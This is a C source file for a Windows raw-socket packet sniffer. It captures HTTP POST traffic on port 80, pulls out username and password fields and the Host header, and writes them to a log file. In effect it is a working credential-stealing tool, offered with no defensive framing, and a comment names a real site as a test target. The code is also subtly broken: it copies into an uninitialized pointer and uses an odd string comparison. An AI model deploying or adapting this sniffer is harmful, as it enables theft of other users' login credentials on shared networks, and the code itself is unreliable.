#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#pragma comment(lib,"ws2_32.lib") //For winsock
 
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1) //this removes the need of mstcpip.h
 
void StartSniffing (SOCKET Sock); //This will sniff here and there
void handle_tcp_packet(char *buffer, int size);
void ProcessPacket (char* , int); //This will decide how to digest
void PrintData (char* , int);
 
typedef struct ip_hdr
{
	unsigned char ip_header_len:4; // 4-bit header length (in 32-bit words) normally=5 (Means 20 Bytes may be 24 also)
	unsigned char ip_version :4; // 4-bit IPv4 version
	unsigned char ip_tos; // IP type of service
	unsigned short ip_total_length; // Total length
	unsigned short ip_id; // Unique identifier
 
	unsigned char ip_frag_offset :5; // Fragment offset field
 
	unsigned char ip_more_fragment :1;
	unsigned char ip_dont_fragment :1;
	unsigned char ip_reserved_zero :1;
 
	unsigned char ip_frag_offset1; //fragment offset
 
	unsigned char ip_ttl; // Time to live
	unsigned char ip_protocol; // Protocol(TCP,UDP etc)
	unsigned short ip_checksum; // IP checksum
	unsigned int ip_srcaddr; // Source address
	unsigned int ip_destaddr; // Source address
} IPV4_HDR;

typedef struct tcp_header
{
	unsigned short source_port; // source port
	unsigned short dest_port; // destination port
	unsigned int sequence; // sequence number - 32 bits
	unsigned int acknowledge; // acknowledgement number - 32 bits
 
	unsigned char ns :1; //Nonce Sum Flag Added in RFC 3540.
	unsigned char reserved_part1:3; //according to rfc
	unsigned char data_offset:4; /*The number of 32-bit words in the TCP header.
	This indicates where the data begins.
	The length of the TCP header is always a multiple
	of 32 bits.*/
 
	unsigned char fin :1; //Finish Flag
	unsigned char syn :1; //Synchronise Flag
	unsigned char rst :1; //Reset Flag
	unsigned char psh :1; //Push Flag
	unsigned char ack :1; //Acknowledgement Flag
	unsigned char urg :1; //Urgent Flag
 
	unsigned char ecn :1; //ECN-Echo Flag
	unsigned char cwr :1; //Congestion Window Reduced Flag
 
	////////////////////////////////
 
	unsigned short window; // window
	unsigned short checksum; // checksum
	unsigned short urgent_pointer; // urgent pointer
} TCP_HDR;
 
FILE *logfile;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
struct sockaddr_in source,dest;
char hex[2];
 
//Its free!
IPV4_HDR *iphdr;
TCP_HDR *tcpheader;
 
int main()
{
	SOCKET sniffer;
	struct in_addr addr;
	int in;
 
	char hostname[100];
	struct hostent *local;
	WSADATA wsa;
 
	logfile=fopen("log.txt","w");
	if(logfile == NULL)
	{
		printf("Unable to create file.");
	}
 
	//Initialise Winsock
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
	{
		printf("WSAStartup() failed.\n");
		return 1;
	}
	printf("Initialised");
 
	//Create a RAW Socket
	printf("\nCreating RAW Socket...");
	sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if (sniffer == INVALID_SOCKET)
	{
		printf("Failed to create raw socket.\n");
		return 1;
	}
	printf("Created.");
 
	//Retrive the local hostname
	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
		printf("Error : %d",WSAGetLastError());
		return 1;
	}
	printf("\nHost name : %s \n",hostname);
 
	//Retrive the available IPs of the local host
	local = gethostbyname(hostname);
	printf("\nAvailable Network Interfaces : \n");
	if (local == NULL)
	{
		printf("Error : %d.\n",WSAGetLastError());
		return 1;
	}
 
	for (i = 0; local->h_addr_list[i] != 0; ++i)
	{
		memcpy(&addr, local->h_addr_list[i], sizeof(struct in_addr));
		printf("Interface Number : %d Address : %s\n",i,inet_ntoa(addr));
	}
 
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d",&in);
 
	memset(&dest, 0, sizeof(dest));
	memcpy(&dest.sin_addr.s_addr,local->h_addr_list[in],sizeof(dest.sin_addr.s_addr));
	dest.sin_family = AF_INET;
	dest.sin_port = 0;
 
	printf("\nBinding socket to local system and port 0 ...");
	if (bind(sniffer,(struct sockaddr *)&dest,sizeof(dest)) == SOCKET_ERROR)
	{
		printf("bind(%s) failed.\n", inet_ntoa(addr));
		return 1;
	}
	printf("Binding successful");
 
	//Enable this socket with the power to sniff : SIO_RCVALL is the key Receive ALL ;)
 
	j=1;
	printf("\nSetting socket to sniff...");
	if (WSAIoctl(sniffer, SIO_RCVALL, &j, sizeof(j), 0, 0, (LPDWORD) &in , 0 , 0) == SOCKET_ERROR)
	{
		printf("WSAIoctl() failed.\n");
		return 1;
	}
	printf("Socket set.");
 
	//Begin
	printf("\nStarted Sniffing\n");
	printf("Packet Capture Statistics...\n");
	StartSniffing(sniffer); //Happy Sniffing
 
	//End
	closesocket(sniffer);
	WSACleanup();
 
	return 0;
}
 
void StartSniffing(SOCKET sniffer)
{
	char *Buffer = (char *)malloc(65536); //Its Big!
	int mangobyte;
 
	if (Buffer == NULL)
	{
		printf("malloc() failed.\n");
		return;
	}
 
	do
	{
		mangobyte = recvfrom(sniffer , Buffer , 65536 , 0 , 0 , 0); //Eat as much as u can
 
		if(mangobyte > 0)
		{
			ProcessPacket(Buffer, mangobyte);
		}
		else
		{
			printf( "recvfrom() failed.\n");
		}
	}
	while (mangobyte > 0);
 
	free(Buffer);
	StartSniffing(sniffer);
}
 
void ProcessPacket(char* buffer, int size)
{
	iphdr = (IPV4_HDR *)buffer;
	if(iphdr->ip_protocol==6)
		handle_tcp_packet(buffer, size);
}
void handle_tcp_packet(char *buffer, int size) {
	unsigned short iphdrlen;
 
	iphdr = (IPV4_HDR *)buffer;
	iphdrlen = iphdr->ip_header_len*4;
 
	tcpheader=(TCP_HDR*)(buffer+iphdrlen);
	if(ntohs(tcpheader->dest_port)==80) {
		PrintData(buffer+iphdrlen+tcpheader->data_offset*4 ,(size-tcpheader->data_offset*4-iphdr->ip_header_len*4));
	}
}
char *replace_str(const char *str, const char *old, const char *new)
{
	char *ret, *r;
	const char *p, *q;
	size_t oldlen = strlen(old);
	size_t count, retlen, newlen = strlen(new);

	if (oldlen != newlen) {
		for (count = 0, p = str; (q = strstr(p, old)) != NULL; p = q + oldlen)
			count++;
		/* this is undefined if p - str > PTRDIFF_MAX */
		retlen = p - str + strlen(p) + count * (newlen - oldlen);
	} else
		retlen = strlen(str);

	if ((ret = malloc(retlen + 1)) == NULL)
		return NULL;

	for (r = ret, p = str; (q = strstr(p, old)) != NULL; p = q + oldlen) {
		/* this is undefined if q - p > PTRDIFF_MAX */
		ptrdiff_t l = q - p;
		memcpy(r, p, l);
		r += l;
		memcpy(r, new, newlen);
		r += newlen;
	}
	strcpy(r, p);

	return ret;
}

void PrintData (char* data , int Size)
{
	if(strstr(data, "POST")!=NULL) {
	    char *fields = NULL;
	    char *host;
	    fields = strtok(data, "\n");
	    while (fields) {
	        /// printf("%s\n", token);
	        if(strstr(fields, "Host: ")!=NULL) {
	        	// strcpy(host, replace_str(token, "Host: ", ""));
	        	strcpy(host, replace_str(fields, "Host: ", ""));
			}
			if(strcmp("", fields)==-13) {
	        	fields = strtok(NULL, "\n");
	        	break;
			}
	        fields = strtok(NULL, "\n");
	    }
	    char *token = NULL;
	    char* s, *temp;
	    char username[512] = {0}, password[512] = {0};
	    token = strtok(fields, "&");
	    /*
	    	referer=http%3A%2F%2Fwww.nullbyte.co.il%2F
			UserName=a
			A -> a
			B -> b
			PassWord=a
			CookieDate=1
	    */
		while(token) {
			strlwr(token);
			if(strstr(token, "username=")!=NULL) {
				snprintf(username, 512, "%s", token);
			}
			else if(strstr(token, "password=")!=NULL) {
				// snprintf(password, 512, "%s", token);
				snprintf(password, 512, "%s", token);
			}
			/*
			strcpy(temp, token);
			s = strtok(temp ,"=");
			if(strcmp(s, "username")==0)
				printf("o.O")
			puts(token);
			*/
			token = strtok(NULL, "&");
		}
		if(username!=NULL) {
			s = strtok(username ,"=");
			s = strtok(NULL, "=");
			snprintf(username, 512, "%s", s);
		}
		if(password!=NULL) {
			s = strtok(password ,"=");
			s = strtok(NULL, "=");
			snprintf(password, 512, "%s", s);
		}
	    // printf("----------------------------\r\n%s\r\n----------------------------------\r\n", token);
	    host[strlen(host)] = '\0';
	    FILE *f = fopen("logfile.txt", "a+");
	    if(host!=NULL&&username!=NULL&&password!=NULL)
	    	fprintf(f, "Username: %s\r\nPassword: %s\r\nHost: %s\r\n", username, password, host);
	    fclose(f);
	}
}
